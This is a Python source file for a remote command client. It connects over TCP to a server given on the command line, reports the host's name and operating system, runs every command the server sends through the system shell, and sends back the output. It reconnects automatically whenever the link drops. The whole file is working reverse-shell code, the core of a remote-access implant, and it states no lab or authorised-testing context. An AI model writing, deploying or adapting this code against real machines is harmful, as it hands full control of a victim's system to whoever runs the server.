import socket
import subprocess
import platform
import sys
import time
import json
import threading
import os
import signal

# Global variables
running = True
process = None
client_socket = None

def send_message(sock, msg_type, data):
    """Send a JSON-formatted message to the server."""
    try:
        # Create message object
        msg_obj = {"type": msg_type, "data": data}
        
        # Convert to JSON string with proper formatting
        message = json.dumps(msg_obj, ensure_ascii=False) + "\n"
        
        # Send with explicit UTF-8 encoding
        sock.sendall(message.encode('utf-8'))
        
        print(f"Sent message: {message.strip()}")
        return True
    except Exception as e:
        print(f"Error sending message: {e}")
        return False

def execute_command(command):
    """Execute a shell command and return the output."""
    global process
    
    try:
        # Determine the shell to use
        shell = True
        if platform.system() == 'Windows':
            # On Windows, we need to use cmd.exe
            command = f"cmd.exe /c {command}"
        
        # Run the command
        result = subprocess.run(
            command,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=30  # 30 second timeout
        )
        
        # Return the output
        return result.stdout
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Error executing command: {e}"

def connect_to_server(server_ip, server_port):
    """Connect to the server and handle communication."""
    global running, client_socket
    
    print(f"Connecting to {server_ip}:{server_port}...")
    
    # Create socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)  # 10 second timeout for connection
        sock.connect((server_ip, server_port))
        sock.settimeout(0.5)  # 0.5 second timeout for recv
        
        client_socket = sock
        print(f"Connected to {server_ip}:{server_port}")
        
        # Send system info
        system_info = f"{platform.node()} - {platform.system()} {platform.release()}"
        send_message(sock, "info", f"Connected from {system_info}")
        
        # Main communication loop
        while running:
            try:
                # Check for commands from server
                data = sock.recv(4096)
                if not data:
                    print("Connection closed by server")
                    break
                
                # Process received data
                data_str = data.decode('utf-8', errors='replace')
                print(f"Raw data received: {data_str}")
                
                # Handle multiple messages or partial messages
                buffer = ""
                for char in data_str:
                    buffer += char
                    if char == '\n':
                        if buffer.strip():
                            try:
                                # Parse JSON message
                                print(f"Parsing JSON: {buffer.strip()}")
                                command_json = json.loads(buffer.strip())
                                
                                # Handle command
                                if command_json.get("type") == "command":
                                    command = command_json.get("data", "")
                                    print(f"Executing command: {command}")
                                    
                                    # Execute the command
                                    output = execute_command(command)
                                    
                                    # Send the output back
                                    print(f"Sending output: {output[:100]}...")
                                    send_message(sock, "output", output)
                            except json.JSONDecodeError as je:
                                print(f"Received invalid JSON: {buffer.strip()}")
                                print(f"JSON error: {je}")
                                send_message(sock, "error", f"Invalid JSON: {je}")
                            except Exception as e:
                                print(f"Error processing message: {e}")
                                send_message(sock, "error", str(e))
                        buffer = ""
            
            except socket.timeout:
                # This is expected due to the timeout we set
                continue
            except ConnectionError as e:
                print(f"Connection error: {e}")
                break
            except Exception as e:
                print(f"Error: {e}")
                break
            
            # Small delay to prevent CPU hogging
            time.sleep(0.01)
        
        return False
    
    except ConnectionRefusedError:
        print(f"Connection refused - Is the server running on {server_ip}:{server_port}?")
    except socket.timeout:
        print(f"Connection timed out - Server at {server_ip}:{server_port} is not responding")
    except Exception as e:
        print(f"Error: {e}")
    
    return False

def cleanup():
    """Clean up resources before exiting."""
    global running, client_socket
    
    print("Cleaning up resources...")
    running = False
    
    if client_socket:
        try:
            client_socket.close()
            print("Socket closed")
        except:
            pass

def signal_handler(sig, frame):
    """Handle Ctrl+C and other signals."""
    print("Signal received, shutting down...")
    cleanup()
    sys.exit(0)

if __name__ == "__main__":
    # Register signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Default values
    server_ip = "localhost"
    server_port = 7878
    
    # Parse command line arguments
    if len(sys.argv) > 1:
        server_ip = sys.argv[1]
    if len(sys.argv) > 2:
        server_port = int(sys.argv[2])
    
    try:
        # Try to connect, and reconnect if the connection is lost
        while running:
            if not connect_to_server(server_ip, server_port):
                print("Connection failed or lost. Reconnecting in 5 seconds...")
                time.sleep(5)
    except KeyboardInterrupt:
        print("Interrupted by user")
    finally:
        cleanup()